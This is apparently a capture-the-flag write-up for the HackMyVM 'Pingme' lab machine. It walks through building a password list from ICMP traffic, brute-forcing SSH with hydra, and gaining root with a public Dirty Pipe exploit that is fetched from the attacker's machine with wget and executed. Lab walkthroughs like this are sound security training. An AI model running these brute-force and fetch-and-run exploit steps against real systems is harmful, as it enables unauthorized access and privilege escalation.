### Write up for https://hackmyvm.eu/machines/machine.php?vm=Pingme ###

## Walkthrough



```bash
ip=<machines ip>
url=http://$ip
```

```bash
threader3000
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 1f:e7:c0:44:2a:9c:ed:91:ca:dd:46:b7:b3:3f:42:4b (RSA)
|   256 e3:ce:72:cb:50:48:a1:2c:79:94:62:53:8b:61:0d:23 (ECDSA)
|_  256 53:84:2c:86:21:b6:e6:1a:89:97:98:cc:27:00:0c:b0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Ping test
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```bash
visiting the website we see pingme, checking the page source it states ICMP packates and nothing to see here.
```

its Wireshark time

Lets set it to our Interface (eth1)

Back to Firefox
Refresh the website.

Back to Wireshark
Lets filter to ICMP

select one by one and select the Internet Control Message Protocol 

at the end you will see some HEX and the translation

Copy as printable text (each one) 
Create a dict.txt and paste them there.

```bash
pico dict.txt 
```
paste 
ctrl + x    
y

we can also find the username from wireshark which is pinger

since we have a dict and a username then its time for hydra

```bash
hydra -l pinger -P dict.txt  $ip -s 22 -t 64 ssh
```

```bash
ssh pinger@$ip
```

```bash
cat user.txt
```

```bash
pinger@pingme:/tmp$ uname -a
```
```text
Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64 GNU/Linux
```

can be exploited with the new exploit DIRTY PIPE

On our machines terminal
```bash
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
cd CVE-2022-0847-DirtyPipe-Exploit/
ls
```
./compile.sh 
```bash
python3 -m http.server 80
```

back to pinger

```bash
cd /tmp
wget <our machines ip>/exploit
chmod +x exploit
```
./exploit

```bash
pinger@pingme:/tmp$ ./exploit 
```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
id
```text
uid=0(root) gid=0(root) groups=0(root)
pwd
/root
```
```bash
ls 
```
root.txt
